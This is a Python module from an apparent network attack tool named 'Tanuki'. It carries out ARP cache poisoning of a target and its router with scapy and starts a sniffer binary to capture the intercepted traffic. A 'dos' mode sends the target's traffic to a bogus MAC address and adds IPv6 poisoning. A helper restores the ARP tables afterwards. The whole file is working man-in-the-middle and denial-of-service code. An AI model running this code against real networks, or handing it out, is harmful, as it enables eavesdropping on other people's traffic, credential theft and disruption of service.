import socket
import threading
import time
import platform
import signal 
from scapy.all import ARP, Ether, sendp, sniff

from scapy.all import ARP, Ether, sendp, sniff

from utils import config
from utils.utilities import get_ip
from utils import utilities
from modules import ipv6_poison

stop_event = threading.Event()





def arp_poison_loop(target_ip, router_ip, dst_mac, spoof_mac):
    #Dedicated loop for ARP poisoning.
    packet = Ether(dst=dst_mac) / ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=spoof_mac)
    while not stop_event.is_set():
        utilities.safe_send(packet)
        time.sleep(0.1)


def restore_arp_tables(target_ip, router_ip, router_mac, target_mac):
    heal_router = Ether(dst=router_mac) / ARP(
        op=2,
        pdst=router_ip,
        psrc=target_ip,
        hwsrc=target_mac,
        hwdst=router_mac,
    )
    heal_target = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=router_ip,
        hwsrc=router_mac,
        hwdst=target_mac,
    )
    for x in range(config.HEAL_PACKETS):
        utilities.safe_send(heal_router)
        utilities.safe_send(heal_target)
        time.sleep(config.HEAL_JITTER)



def start_sniffer_binary():
    import subprocess
    current_os = platform.system() 

    if current_os == "Windows":
        arguments = ["sniffer.exe"]
    elif current_os in ["Linux", "Darwin"]:
        arguments = ["./sniffer"]
    else:
        arguments = None

    if not arguments: 
        print("Couldn't determine OS, unfortunately Tanuki may not have a sniffer binary for your OS!")
        print("Updates are coming, but in the meantime feel free to download older versions of Tanuki.")
        print("Deprecated versions are purely python, and will run independent of your OS.")
        print("Sorry for the inconvenience!")
        exit(2)

    #what a function
    sniffer_binary = subprocess.Popen(args=arguments, start_new_session=True,stdout=subprocess.PIPE, stdin=subprocess.PIPE, text=True, cwd="modules/binaries")

    sniffer_binary.stdin.write(config.BPF)
    sniffer_binary.stdin.flush()
    print("Packet sniffer opened successfully, the capture has begun! ^-^\nPress ctrl+c at any time to exit.")
    while not stop_event.is_set(): 
        time.sleep(2)
    sniffer_binary.send_signal(signal.SIGINT)
    out, err = sniffer_binary.communicate()
    print(out)




def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac, dos):
    stop_event.clear()
    threads = []

    #Target poisonong
    address = "00:00:00:00:00:03" if dos else attacker_mac
    target_thread = threading.Thread(
        target=arp_poison_loop,
        args=(target_ip, router_ip, target_mac, address),
        daemon=True,
    )
    threads.append(target_thread)

    #Router Poisoning
    router_thread = threading.Thread(
        target=arp_poison_loop,
        args=(router_ip, target_ip, router_mac, attacker_mac),
        daemon=True,
    )
    threads.append(router_thread)


    if dos:
        print("Starting IPv6 poisoning...")
        ipv6_thread = threading.Thread(
            target=ipv6_poison.poison_service, args=(target_mac,), daemon=True
        )
        threads.append(ipv6_thread)

    else:
        sniff_thread = threading.Thread(
            target=start_sniffer_binary,
            daemon=True,
        )
        threads.append(sniff_thread)

    for thread in threads:
        thread.start()
    return threads
